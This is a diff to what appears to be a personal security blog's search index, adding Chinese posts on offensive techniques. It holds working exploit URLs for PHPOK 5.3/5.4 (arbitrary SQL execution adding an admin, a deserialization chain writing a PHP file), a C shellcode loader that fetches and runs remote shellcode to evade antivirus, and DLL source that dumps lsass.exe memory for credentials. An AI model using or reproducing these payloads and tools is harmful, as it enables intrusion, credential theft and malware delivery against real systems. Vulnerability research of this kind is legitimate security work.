@@ -4,6 +4,106 @@
   
   
   <entry>
+    <title>代码审计之PHPOK其二</title>
+    <link href="/2020/07/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPOK%E5%85%B6%E4%BA%8C/"/>
+    <url>/2020/07/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPOK%E5%85%B6%E4%BA%8C/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>代码审计系列</p><a id="more"></a><h2 id="审计版本"><a href="#审计版本" class="headerlink" title="审计版本"></a>审计版本</h2><p>PHPOK5.4</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><code>/framework/api/call_control.php</code><br><img src="/images/image001.jpg" alt="1"><br>5.4版本在5.3版本的基础上进行了修补，对$data变量进行了过滤，来防止反序列化漏洞。<br>跟进$this-&gt;format()函数<br><img src="/images/image002.jpg" alt="1"><br>分析代码，发现$type值为safe，进入最后的switch控制语句：<br><img src="/images/image003.jpg" alt="1"><br>分析代码，发现对,‘,”,&lt;,&gt;进行了转义：<br>返回，发现依然进入phpok函数：<br><img src="/images/image004.jpg" alt="1"><br>跟进<br><img src="/images/image005.jpg" alt="1"><br>跟进<br><img src="/images/image006.jpg" alt="1"><br>发现phpok5.4版本在phpok5.3版本上仅仅做了一个过滤$data的修复，但是对动态调用并未做出处理，因此，还是可以在5.3版本的基础上进行绕过利用。</p><p>在/framework/phpok_call.php重新寻找可利用函数：<br>发现_sql()函数，当中会对单双引号进行反转义<br><img src="/images/image007.jpg" alt="1"><br>相当于绕过之前format()函数的处理<br>跟进get_all()函数：<br><img src="/images/image008.jpg" alt="1"><br>发现一个sql执行点，跟进函数：<br><img src="/images/image009.jpg" alt="1"><br>可以看到，用户输入的sql语句被带入数据库进行执行。<br>因此，我们控制json_data数据的值，就可以动态调用_sql()函数</p><h3 id="构造json数组"><a href="#构造json数组" class="headerlink" title="构造json数组"></a>构造json数组</h3><pre><code>http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5_4`.`qinggan_adm`(`id`, `account`, `pass`, `email`, `status`, `if_system`, `vpass`, `fullname`, `close_tip`) VALUES (22,&#39;22&#39;,&#39;22&#39;,&#39;22&#39;,22,22,22,22,22)&quot;}}</code></pre><p>在管理员表里创建一个用户：<br><img src="/images/image010.jpg" alt="1"><br>成功创建：<br><img src="/images/image011.jpg" alt="1"><br>任意sql语句执行利用成功</p><h3 id="从任意sql语句执行到反序列化"><a href="#从任意sql语句执行到反序列化" class="headerlink" title="从任意sql语句执行到反序列化"></a>从任意sql语句执行到反序列化</h3><p>在/framework/phpok_call.php文件中，存在另外一个函数：_fields()<br><img src="/images/image012.jpg" alt="1"><br>存在一处反序列化函数：<br><img src="/images/image013.jpg" alt="1"><br>跟踪unserialize()函数中的变量：$value[‘ext’]<br><img src="/images/image014.jpg" alt="1"><br><img src="/images/image015.jpg" alt="1"><br>可以发现，最终unserialize()函数中的参数可由用户控制<br>查看project_one()函数：<br><img src="/images/image016.jpg" alt="1"><br><img src="/images/image017.jpg" alt="1"><br>分析代码，此处为获取prefix.project表里的一条数据<br><img src="/images/image018.jpg" alt="1"><br>获取prefix.fields表里的所有数据<br>field表里的数据被带入$rslist返回给$flist，最终传入unserialize()函数。</p><p>因此只要field表里的数据是一个序列化利用字符串，就可以被带入unserialize()函数，造成反序列化漏洞。</p><p>同时上文可以得知，我们可以控制sql达到任意sql语句执行的目的，因此我们可以先控制sql语句执行，插入一条payload到field表中，再经过_field()函数将payload取出，带入unserialize()函数中，造成反序列化漏洞。</p><h3 id="数据关系"><a href="#数据关系" class="headerlink" title="数据关系"></a>数据关系</h3><p>pid控制get_one()的数据。<br>返回的数据中的module值控制get_all()的值<br>get_all()中的ext传入unserialize()</p><h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><pre><code>Payload1:http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5_4`.`qinggan_project` VALUES (333,333,1,333,333,&#39;qweqwe&#39;,&#39;qweqwe&#39;,3,3,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,3,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,333,333,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,3,3,3,3,3,3,3,3,&#39;qwe&#39;,3,3,3,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,3,&#39;qwe&#39;,3,3,3,&#39;qwe&#39;,&#39;qwe&#39;,3,3)&quot;}}</code></pre><p><img src="/images/image019.jpg" alt="1"></p><pre><code>payload2：http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5_4`.`qinggan_fields`(`id`, `ftype`, `title`, `identifier`, `field_type`, `note`, `form_type`, `form_style`, `format`, `content`, `ext`, `search_separator`, `form_class`) VALUES (1234, &#39;333&#39;, &#39;test&#39;, &#39;test&#39;, &#39;varchar&#39;, &#39;test&#39;, &#39;text&#39;, &#39;test&#39;, &#39;safe&#39;, &#39;test&#39;, 0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a35363a227068703a2f2f66696c7465722f77726974653d636f6e766572742e6261736536342d6465636f64652f7265736f757263653d717771777177223b733a31313a22002a006b65795f6c697374223b733a32363a2261615044397761484167634768776157356d627967704f7a382b223b733a393a22002a00666f6c646572223b733a303a22223b7d, &#39;test&#39;, &#39;test&#39;)&quot;}}</code></pre><p><img src="/images/image020.jpg" alt="1"></p><pre><code>payload3：http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;fields&quot;,&quot;pid&quot;:333}}</code></pre><p><img src="/images/image021.jpg" alt="1"><br>访问写入的phpinfo文件，成功写入：<br><img src="/images/image022.jpg" alt="1"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>代码审计</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>PHPOK</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>代码审计之PHPOK其一</title>
+    <link href="/2020/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPOK%E5%85%B6%E4%B8%80/"/>
+    <url>/2020/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPOK%E5%85%B6%E4%B8%80/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>代码审计系列</p><a id="more"></a><h2 id="审计版本"><a href="#审计版本" class="headerlink" title="审计版本"></a>审计版本</h2><p>PHPOK5.3</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h3><p><code>/framework/api/call_control.php</code><br><img src="/images/phpok1.jpg" alt="1"><br>这里，用户可控$data的值，可以控制传入phpok()函数的值<br>跟进phpok函数：<br><img src="/images/phpok2.jpg" alt="1"><br>可以看到进入了phpok_call.php中的phpok函数，继续跟进：<br><img src="/images/phpok3.jpg" alt="1"><br>可以看到有一处动态调用，跟踪变量：<br><img src="/images/phpok4.jpg" alt="1"><br><img src="/images/phpok5.jpg" alt="1"><br>可以看到$func和$call_rs都来自于$rs，而$rs属于可控变量<br>在变量处理中发现一处过滤<br><img src="/images/phpok6.jpg" alt="1"><br>可以debug看一下$this-&gt;mlist具体的值：<br><img src="/images/phpok7.jpg" alt="1"><br>可以看到，本类所有函数名都在数组中，说明本类所有函数都可以调用<br>查找可利用的函数，发现_format_ext_all函数<br><img src="/images/phpok8.jpg" alt="1"><br>构造POP链：<br>/framework/engine/cache.php<br><img src="/images/phpok9.jpg" alt="1"><br>跟进save函数：<br><img src="/images/phpok10.jpg" alt="1"><br>这里$file可控，$content可控，因此file_put_content()函数可以造成恶意写入shell。</p><h3 id="绕过exit"><a href="#绕过exit" class="headerlink" title="绕过exit()"></a>绕过exit()</h3><p>这里，即使控制写入shell，因为存在一个exit()函数，shell也不能成功运行，因此需要绕过exit()函数。<br>此时想起php伪协议的利用：<br><code>php://filter/write=convert.base64-decode</code><br>因为base64的可打印字符是[A-Za-z0-9]，<?();?>不在base64的编码范围之中，因此使用base64可以将<?();?>字符给吃掉。<br>此处由一个serialize函数会将$content传入”和;字符<br><img src="/images/phpok11.jpg" alt="1"><br>base64同样会吃掉特殊字符，余下s30<br>所以总共有phpexits30需要被base64节目米<br>由于base64-decode是4个为一组来解密的，所以需要补齐字符以免payload收到影响<br>因此构造payload：<code>qqPD9waHAgQHBocGluZm8oKTs/Pg==</code></p><h3 id="POP链生成"><a href="#POP链生成" class="headerlink" title="POP链生成"></a>POP链生成</h3><p>由于存在protected变量，反序列化字符串会带有%00，而json_decode不支持%00，因此需要转换%00为\u0000，同时转移”和/</p><h3 id="POP链生成代码"><a href="#POP链生成代码" class="headerlink" title="POP链生成代码"></a>POP链生成代码</h3><pre><code>&lt;?phpclass cache{    protected $key_id;    protected $key_list;    protected $folder;    public function __construct()    {        $this-&gt;key_id = &quot;php://filter/write=convert.base64-decode/resource=1&quot;;        $this-&gt;folder = &quot;&quot;;        $this-&gt;key_list = &quot;qqPD9waHAgQHBocGluZm8oKTs/Pg==&quot;;    }}$c = new cache();$c = serialize($c);$c = str_replace(&#39;&quot;&#39;,&#39;\\&quot;&#39;,$c);$c = str_replace(&#39;/&#39;,&#39;\\/&#39;,$c);$c = preg_replace(&#39;/\x00/&#39;,&#39;\u0000&#39;,$c);echo $c;?&gt;</code></pre><h3 id="json数组构造"><a href="#json数组构造" class="headerlink" title="json数组构造"></a>json数组构造</h3><pre><code>{&quot;m_picplayer&quot;:{&quot;type_id&quot;:&quot;format_ext_all&quot;,&quot;cache&quot;:&quot;false&quot;,&quot;id&quot;:{&quot;form_type&quot;:&quot;url&quot;,&quot;content&quot;:&quot;O:5:\&quot;cache\&quot;:3:{s:9:\&quot;\u0000*\u0000key_id\&quot;;s:51:\&quot;php://filter/write=convert.base64-decode/resource=1\&quot;;s:11:\&quot;\u0000*\u0000key_list\&quot;;s:30:\&quot;qqPD9waHAgQHBocGluZm8oKTs/Pg==\&quot;;s:9:\&quot;\u0000*\u0000folder\&quot;;s:0:\&quot;\&quot;;}&quot;}}}</code></pre><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>payload：</p><pre><code>http://localhost/5.3/api.php?c=call&amp;data={&quot;m_picplayer&quot;:{&quot;type_id&quot;:&quot;format_ext_all&quot;,&quot;cache&quot;:&quot;false&quot;,&quot;id&quot;:{&quot;form_type&quot;:&quot;url&quot;,&quot;content&quot;:&quot;O:5:\&quot;cache\&quot;:3:{s:9:\&quot;\u0000*\u0000key_id\&quot;;s:51:\&quot;php://filter/write=convert.base64-decode/resource=1\&quot;;s:11:\&quot;\u0000*\u0000key_list\&quot;;s:30:\&quot;qqPD9waHAgQHBocGluZm8oKTs/Pg==\&quot;;s:9:\&quot;\u0000*\u0000folder\&quot;;s:0:\&quot;\&quot;;}&quot;}}}</code></pre><p><img src="/images/phpok12.jpg" alt="1"><br>phpinfo已成功上传：<br><img src="/images/phpok13.jpg" alt="1"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>代码审计</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>PHPOK</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>基于远程文件下载的免杀shellcode加载器</title>
+    <link href="/2020/05/25/%E5%9F%BA%E4%BA%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
+    <url>/2020/05/25/%E5%9F%BA%E4%BA%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为在实际环境中经常碰到杀软，网上广为流传的绕过方式都不好使。所以就自己动手造了个轮子。</p><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>目前杀软的三种查杀模式分别是：静态检测、流量检测、行为分析。</p><h3 id="静态检测与对抗"><a href="#静态检测与对抗" class="headerlink" title="静态检测与对抗"></a>静态检测与对抗</h3><p>一般来说，msf生成的shellcode特征太过明显，已经被各大杀软加入特征库。因此，在不手写shellcode的前提下，使用msf生成的shellcode，文件不落地是一个较好的对抗方式。</p><h3 id="流量检测"><a href="#流量检测" class="headerlink" title="流量检测"></a>流量检测</h3><p>metasploit的木马分为两个大类，staged 和stageless 。<br>日常我们用的木马类型为staged。<br>在静态检测的对抗中，可以发现即时静态检测已经成功对抗，但在接受stager的时候，会被杀软（卡巴斯基和赛门铁克）的流量检测给抓住特征，造成回弹shell失败。<br>因此可以编码stager再发送：</p><pre><code>set EnableStageEncoding trueset StageEncoder x86/fnstenv_mov</code></pre><p>或者使用</p><pre><code> windows/meterpreter/reverse_https windows/meterpreter/reverse_tcp_rc4</code></pre><h3 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h3><p>知识盲区</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code>#include &lt;Windows.h&gt;#include &lt;wininet.h&gt;#include &lt;string&gt;#include &lt;tchar.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;#pragma comment(lib, &quot;wininet.lib&quot;)#define BUF_SIZE 1024#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)LPSTR GetInterNetURLText(LPSTR lpcInterNetURL, char* buff){    HINTERNET hSession;    LPSTR lpResult = NULL;    hSession = InternetOpen(&quot;WinInet&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);    __try    {        if (hSession != NULL)        {            HINTERNET hRequest;            hRequest = InternetOpenUrlA(hSession, lpcInterNetURL, NULL, 0, INTERNET_FLAG_RELOAD, 0);            __try            {                if (hRequest != NULL)                {                    DWORD dwBytesRead;                    char szBuffer[BUF_SIZE] = { NULL };                    if (InternetReadFile(hRequest, szBuffer, BUF_SIZE, &amp;dwBytesRead))                    {                        RtlMoveMemory(buff, szBuffer, BUF_SIZE);                        return buff;                    }                }            }            __finally            {                InternetCloseHandle(hRequest);            }        }    }    __finally    {        InternetCloseHandle(hSession);    }    return lpResult;}int main(int argc, _TCHAR* argv[]){    char buf[BUF_SIZE] = { 0 };    char url[MAX_PATH] = &quot;payload-url&quot;;    LPSTR hex_instructions = GetInterNetURLText(url, buf);    const char* ShellCode = hex_instructions;    int shellcode_length = strlen(ShellCode);    unsigned char* value = (unsigned char*)calloc(shellcode_length / 2, sizeof(unsigned char));    for (size_t count = 0; count &lt; shellcode_length / 2; count++) {        sscanf(ShellCode, &quot;%2hhx&quot;, &amp;value[count]);        //printf(&quot;%d&quot;, value[count]);        ShellCode += 2;    }    void* exec = VirtualAlloc(0, shellcode_length / 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, value, shellcode_length / 2);    ((void(*)())exec)();    return 0;}</code></pre><p>在自己的服务器放16进制的shellcode。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>免杀对抗</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透工具</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>RPC调用SSP绕过杀软进行hashdump</title>
+    <link href="/2020/05/01/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump/"/>
+    <url>/2020/05/01/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Ateam《这是一篇“不一样”的真实渗透测试案例分析文章》文章，学到了一些新姿势，根据里面提到的某些技术做一些简单总结</p><a id="more"></a><h2 id="通过RPC调用添加一个SSP-dll进行dump-lsass-exe"><a href="#通过RPC调用添加一个SSP-dll进行dump-lsass-exe" class="headerlink" title="通过RPC调用添加一个SSP dll进行dump lsass.exe"></a>通过RPC调用添加一个SSP dll进行dump lsass.exe</h2><p>XPN大牛写的RPC加载SSP的代码<br><a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e" target="_blank" rel="noopener">https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</a><br>下载下来有三个文件，用vs把它们编译成exe<br>我这里采用的是vs2019<br>需要在c文件里加上<br><code>#pragma comment(lib, &quot;Rpcrt4.lib&quot;)</code><br>这里采用x64编译生成exe(因为c代码是64位的)<br>编译成功如下：<br><img src="/images/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump-1.png" alt="1"></p><p>然后再准备一个dump进程的dll<br>这里借用的是网上开源的一个dll</p><pre><code>#include &lt;cstdio&gt;#include &lt;windows.h&gt;#include &lt;DbgHelp.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;  #include &lt;map&gt;  #include &lt;TlHelp32.h&gt; #pragma comment(lib,&quot;Dbghelp.lib&quot;)using namespace std;int FindPID(){    PROCESSENTRY32 pe32;    pe32.dwSize = sizeof(pe32);    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (hProcessSnap == INVALID_HANDLE_VALUE) {        cout &lt;&lt; &quot;CreateToolhelp32Snapshot Error!&quot; &lt;&lt; endl;;        return false;    }    BOOL bResult = Process32First(hProcessSnap, &amp;pe32);    while (bResult)    {        if (_wcsicmp(pe32.szExeFile, L&quot;lsass.exe&quot;) == 0)        {            return pe32.th32ProcessID;        }        bResult = Process32Next(hProcessSnap, &amp;pe32);    }    CloseHandle(hProcessSnap);    return -1;}typedef HRESULT(WINAPI* _MiniDumpW)(    DWORD arg1, DWORD arg2, PWCHAR cmdline);typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(    ULONG Privilege, BOOL Enable,    BOOL CurrentThread, PULONG Enabled);int dump() {    HRESULT             hr;    _MiniDumpW          MiniDumpW;    _RtlAdjustPrivilege RtlAdjustPrivilege;    ULONG               t;    MiniDumpW = (_MiniDumpW)GetProcAddress(        LoadLibrary(L&quot;comsvcs.dll&quot;), &quot;MiniDumpW&quot;);    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(        GetModuleHandle(L&quot;ntdll&quot;), &quot;RtlAdjustPrivilege&quot;);    if (MiniDumpW == NULL) {        return 0;    }    // try enable debug privilege    RtlAdjustPrivilege(20, TRUE, FALSE, &amp;t);    wchar_t  ws[100];    swprintf(ws, 100, L&quot;%hd%hs&quot;, FindPID(), &quot; C:\\1.bin full&quot;);     MiniDumpW(0, 0, ws);    return 0;}BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {    switch (ul_reason_for_call) {    case DLL_PROCESS_ATTACH:        dump();        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}</code></pre><p>使用效果：<br><img src="/images/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump-2.png" alt="2"><br><img src="/images/RPC%E8%B0%83%E7%94%A8SSP%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E8%BF%9B%E8%A1%8Chashdump-3.png" alt="3"></p><h3 id="dump失败的可能原因"><a href="#dump失败的可能原因" class="headerlink" title="dump失败的可能原因"></a>dump失败的可能原因</h3><ul><li>dll路径没有使用绝对路径</li><li>没有以管理员权限启动</li></ul><h2 id="加载mimilib记录明文密码"><a href="#加载mimilib记录明文密码" class="headerlink" title="加载mimilib记录明文密码"></a>加载mimilib记录明文密码</h2><p>利用上面的ssp_loader，我们可以利用ssp加载mimilib达到不重启记录密码的操作</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>免杀对抗</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透工具</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>反射机制</title>
     <link href="/2020/03/31/Java%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
     <url>/2020/03/31/Java%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
@@ -130,22 +230,22 @@
   
   <entry>
     <title>常见解析漏洞</title>
-    <link href="/2019/04/23/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
-    <url>/2019/04/23/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+    <link href="/2019/03/16/%E5%B8%B8%E8%A7%81%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2019/03/16/%E5%B8%B8%E8%A7%81%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
     
     <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为搞站中碰到了一起解析漏洞的站，所以对此总结一下所有解析漏洞</p><a id="more"></a><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="IIS5-x-6-0"><a href="#IIS5-x-6-0" class="headerlink" title="IIS5.x/6.0"></a>IIS5.x/6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>目录名包含<code>.asp .asa .cer</code>这种字样，该文件夹下所有的文件均可以当作asp来解析</p><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>以为服务器不解析;后的内容，所以<code>/xx.asp;.jpg</code>可以被当作asp来解析</p><h4 id="IIS特殊后缀名"><a href="#IIS特殊后缀名" class="headerlink" title="IIS特殊后缀名"></a>IIS特殊后缀名</h4><ul><li>asa</li><li>cer</li><li>cdx</li></ul><h3 id="IIS7-0-IIS7-5"><a href="#IIS7-0-IIS7-5" class="headerlink" title="IIS7.0/IIS7.5"></a>IIS7.0/IIS7.5</h3><p>默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件</p><p>如：<code>test.jpg/.php</code>会被当做php来执行</p><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h3><p>默认fast-cgi开启状况下，在一个文件路径后面加上/xx.php会将原来的文件解析为php文件</p><p>如：<code>test.jpg/.php</code>会被当做php来执行</p><h3 id="空字节代码执行"><a href="#空字节代码执行" class="headerlink" title="空字节代码执行"></a>空字节代码执行</h3><p>在fast-cgi关闭的情况下，nginx版本:0.5.<em>, 0.6.</em>, 0.7- 0.7.65, 0.8 -0.8.37，nginx在图片后附加php代码然后通过访问<code>xxx.jpg%00.php</code>来达到代码执行的目的</p><h3 id="文件名逻辑漏洞"><a href="#文件名逻辑漏洞" class="headerlink" title="文件名逻辑漏洞"></a>文件名逻辑漏洞</h3><p>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x 正常上传一个附加代码的图片”test.jpg”，访问时后面+”空格”+”\0”+”.php”，即让图片作为php文件解析</p><p><code>/test.jpg \0.php</code></p><h3 id="配置不当造成的目录穿越"><a href="#配置不当造成的目录穿越" class="headerlink" title="配置不当造成的目录穿越"></a>配置不当造成的目录穿越</h3><p>如果绝对路径”/home/“的URL映射是网站目录”/les/“，配置写成了”/les”</p><pre><code>location /files { alias /home/;}</code></pre><p>就可以访问”/les../“，穿越路径，访问到绝对路径根目录”/“下的文件列表</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>Apache从右向左解析，后缀不可识别就向左。因此<code>test.php.xxx</code>被当作php进行执行</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="Windows保留字"><a href="#Windows保留字" class="headerlink" title="Windows保留字"></a>Windows保留字</h3><p>windows文件夹名不允许出现以下字符</p><p><code>\ / : * ? &quot; &lt; &gt; |</code></p><h3 id="被去除的符号"><a href="#被去除的符号" class="headerlink" title="被去除的符号"></a>被去除的符号</h3><p>  windows不允许[空格]和[.]的存在，会默认去除，所以test.php和test.php.将会是一个文件</p><h3 id="长文件名截取"><a href="#长文件名截取" class="headerlink" title="长文件名截取"></a>长文件名截取</h3><p>Windows最长文件名为255，超出将被截取</p>]]></content>
     
     
     <categories>
       
-      <category>Web安全</category>
+      <category>CTF</category>
       
     </categories>
     
     
     <tags>
       
-      <tag>解析漏洞</tag>
+      <tag>crypto</tag>
       
     </tags>
     
